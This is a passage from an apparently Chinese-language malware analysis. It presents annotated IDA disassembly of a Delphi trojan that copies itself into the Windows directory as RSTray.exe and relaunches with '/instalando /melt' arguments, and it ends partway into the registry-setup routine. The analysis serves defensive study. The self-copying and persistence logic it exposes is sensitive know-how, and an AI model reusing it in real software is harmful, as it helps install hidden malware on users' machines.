
```assembly
CODE:0043333F                 call    System::\_\_linkproc\_\_ LStrToPChar(System::AnsiString)

CODE:0043333F

CODE:00433344                 push    eax             ; lpNewFileName

CODE:00433345                 lea     edx, [ebp+var\_10]

CODE:00433348                 xor     eax, eax

CODE:0043334A                 call    System::ParamStr(int)

CODE:0043334A

CODE:0043334F                 mov     eax, [ebp+var\_10]

CODE:00433352                 call    System::\_\_linkproc\_\_ LStrToPChar(System::AnsiString)

CODE:00433352

CODE:00433357                 push    eax             ; lpExistingFileName

CODE:00433358                 call    CopyFileA       ; 把木马复制到 Windows 目录，根据解码后的配置文件，改名为 RSTray.exe

CODE:00433358

CODE:0043335D                 mov     eax, ds:off\_436188

CODE:00433362                 cmp     byte ptr [eax], 1

CODE:00433365                 jnz     short loc\_4333C9

CODE:00433365

CODE:00433367                 push    0               ; nShowCmd

CODE:00433369                 push    offset Directory ; lpDirectory

CODE:0043336E                 push    offset s->InstalandoMelt ; "/instalando /melt \""

CODE:00433373                 lea     edx, [ebp+var\_1C]

CODE:00433376                 xor     eax, eax

CODE:00433378                 call    System::ParamStr(int)

CODE:00433378

CODE:0043337D                 mov     eax, [ebp+var\_1C]

CODE:00433380                 call    System::\_\_linkproc\_\_ LStrToPChar(System::AnsiString)

CODE:00433380

CODE:00433385                 mov     edx, eax

CODE:00433387                 lea     eax, [ebp+var\_18]

CODE:0043338A                 call    \_Get\_String\_Len ; BDS 2005-2006 and Delphi6-7 Visual Component Library

CODE:0043338A

CODE:0043338F                 push    [ebp+var\_18]

CODE:00433392                 push    offset dword\_433444

CODE:00433397                 lea     eax, [ebp+var\_14]

CODE:0043339A                 mov     edx, 3

CODE:0043339F                 call    System::\_\_linkproc\_\_ LStrCatN(void)

CODE:0043339F

CODE:004333A4                 mov     eax, [ebp+var\_14]

CODE:004333A7                 call    System::\_\_linkproc\_\_ LStrToPChar(System::AnsiString)

CODE:004333A7

CODE:004333AC                 push    eax             ; lpParameters

CODE:004333AD                 mov     eax, ds:off\_4361BC

CODE:004333B2                 mov     eax, [eax]

CODE:004333B4                 call    System::\_\_linkproc\_\_ LStrToPChar(System::AnsiString)

CODE:004333B4

CODE:004333B9                 push    eax             ; lpFile

CODE:004333BA                 push    0               ; lpOperation

CODE:004333BC                 mov     eax, ds:hInstance

CODE:004333C1                 push    eax             ; hwnd

CODE:004333C2                 call    ShellExecuteA   ; 加上面的 /instalando /melt 参数运行木马

CODE:004333C2

CODE:004333C7                 jmp     short loc\_4333EF

CODE:004333C7

CODE:004333C9 ; ---------------------------------------------------------------------------

CODE:004333C9

CODE:004333C9 loc\_4333C9:                             ; CODE XREF: \_Copy\_and\_Run+A1j

CODE:004333C9                 push    0               ; nShowCmd

CODE:004333CB                 push    offset Directory ; lpDirectory

CODE:004333D0                 push    offset Parameters ; "/instalando"

CODE:004333D5                 mov     eax, ds:off\_4361BC

CODE:004333DA                 mov     eax, [eax]

CODE:004333DC                 call    System::\_\_linkproc\_\_ LStrToPChar(System::AnsiString)

CODE:004333DC

CODE:004333E1                 push    eax             ; lpFile

CODE:004333E2                 push    0               ; lpOperation

CODE:004333E4                 mov     eax, ds:hInstance

CODE:004333E9                 push    eax             ; hwnd

CODE:004333EA                 call    ShellExecuteA

CODE:004333EA

CODE:004333EF

CODE:004333EF loc\_4333EF:                             ; CODE XREF: \_Copy\_and\_Run+103j

CODE:004333EF                 call    System::\_\_linkproc\_\_ Halt0(void)

CODE:004333EF

CODE:004333F4 ; ---------------------------------------------------------------------------

CODE:004333F4

CODE:004333F4 loc\_4333F4:                             ; CODE XREF: \_Copy\_and\_Run+6Cj

CODE:004333F4                 xor     eax, eax

CODE:004333F6                 pop     edx

CODE:004333F7                 pop     ecx

CODE:004333F8                 pop     ecx

CODE:004333F9                 mov     fs:[eax], edx

CODE:004333FC                 push    offset loc\_433416

CODE:004333FC

CODE:00433401

CODE:00433401 loc\_433401:                             ; CODE XREF: \_Copy\_and\_Run+150j

CODE:00433401                 lea     eax, [ebp+var\_1C]

CODE:00433404                 mov     edx, 7

CODE:00433409                 call    System::\_\_linkproc\_\_ LStrArrayClr(void \*,int)

CODE:00433409

CODE:0043340E                 retn

CODE:0043340E

CODE:0043340F ; ---------------------------------------------------------------------------

CODE:0043340F

CODE:0043340F loc\_43340F:                             ; DATA XREF: \_Copy\_and\_Run+Fo

CODE:0043340F                 jmp     unknown\_libname\_48 ; BDS 2005-2006 and Delphi6-7 Visual Component Library

CODE:0043340F

CODE:00433414 ; ---------------------------------------------------------------------------

CODE:00433414                 jmp     short loc\_433401

CODE:00433414

CODE:00433416 ; ---------------------------------------------------------------------------

CODE:00433416

CODE:00433416 loc\_433416:                             ; CODE XREF: \_Copy\_and\_Run+14Aj

CODE:00433416                                         ; DATA XREF: \_Copy\_and\_Run+138o

CODE:00433416                 mov     esp, ebp

CODE:00433418                 pop     ebp

CODE:00433419                 retn

CODE:00433419

CODE:00433419 \_Copy\_and\_Run   endp
```

以上为文件复制部分的代码，这里我不详细讲了，只给出结果：

木马在系统的 Windows 目录下复制自身，并命名为`RSTray.exe`，带参数`/instalando /melt`运行。

---

### 三、注册表的设置

```assembly
CODE:0043375C \_Set\_Reg\_Info   proc near               ; CODE XREF: CODE:00434146p

CODE:0043375C

CODE:0043375C var\_14          = dword ptr -14h

CODE:0043375C var\_10          = dword ptr -10h

CODE:0043375C var\_C           = dword ptr -0Ch

CODE:0043375C var\_8           = dword ptr -8

CODE:0043375C var\_4           = dword ptr -4

CODE:0043375C

CODE:0043375C                 push    ebp

CODE:0043375D                 mov     ebp, esp

CODE:0043375F                 xor     ecx, ecx

CODE:00433761                 push    ecx

CODE:00433762                 push    ecx

CODE:00433763                 push    ecx

CODE:00433764                 push    ecx

CODE:00433765                 push    ecx

CODE:00433766                 push    ebx

CODE:00433767                 mov     ebx, ds:off\_436284

CODE:0043376D                 xor     eax, eax

CODE:0043376F                 push    ebp

CODE:00433770                 push    offset loc\_43388C

CODE:00433775                 push    dword ptr fs:[eax]

CODE:00433778                 mov     fs:[eax], esp

CODE:0043377B                 lea     edx, [ebp+var\_4]

CODE:0043377E                 mov     eax, 1

CODE:00433783                 call    System::ParamStr(int)

CODE:00433783

CODE:00433788                 mov     eax, [ebp+var\_4]

CODE:0043378B                 mov     edx, offset s->Reactivateactivex ; "/reactivateActiveX"

CODE:00433790                 call    System::\_\_linkproc\_\_ **LStrCmp**(void)

CODE:00433790

CODE:00433795                 jnz     short loc\_4337B9
```
